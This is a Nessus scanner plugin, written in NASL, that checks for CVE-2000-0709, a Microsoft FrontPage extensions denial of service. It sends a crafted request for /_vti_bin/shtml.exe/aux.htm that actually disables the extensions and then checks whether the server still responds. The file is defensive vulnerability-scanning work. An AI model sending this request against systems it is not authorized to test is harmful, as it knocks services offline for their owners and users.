#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10497);
 script_bugtraq_id(1608);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2000-0709");

 name["english"] = "Microsoft Frontpage DoS";
 name["francais"] = "Déni de service Microsoft Frontpage"; 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to disable the remote frontpage extensions
by requesting a URL containing the name of a DOS device
through shtml.exe, as :
	GET /_vti_bin/shtml.exe/aux.htm
	
An attacker may use this flaw to prevent anyone to change
this website using frontpage.

Solution : Upgrade to FP 1.2
Risk factor : High";

 desc["francais"] = "
Il est possible de désactiver les extensions frontpage
du site distant en faisant la requète d'une URL contenant
le nom d'un périphérique DOS, en passant par shtml.exe, comme
dans :
	GET /_vti_bin/shtml.exe/aux.htm
	
Un pirate peut utiliser ce problème pour empecher qui que ce
soit de changer de site web par l'intermediaire de FrontPage

Solution : Mettez FrontPage à jour en version 1.2
Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Disables Microsoft Frontpage extensions";
 summary["francais"] = "Désactive les extensions Frontpage";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);

if(get_port_state(port))
{
 soc = http_open_socket(port);
  if(soc)
  {

    name = get_host_name();
    req1 = http_get(item:"/_vti_bin/shtml.exe",
    	 	    port:port);
		    
    req2 = http_get(item:"/_vti_bin/shtml.exe/aux.htm",
    	 	    port:port);
  
    send(socket:soc, data:req1);
    r1 = recv_line(socket:soc, length:1024);
    http_close_socket(soc);
    if(ereg(pattern:"HTTP/[0-9]\.[0-9] 200 .*", 
    	    string:r1))
    {	    
    soc = http_open_socket(port);
    send(socket:soc, data:req2);
    r2 = recv_line(socket:soc, length:1024);
    http_close_socket(soc);

    soc = http_open_socket(port);
    send(socket:soc, data:req1);
    r3 = recv_line(socket:soc, length:1024);
    http_close_socket(soc);
    
    if(!r3)security_hole(port);
    }
  }
}
    
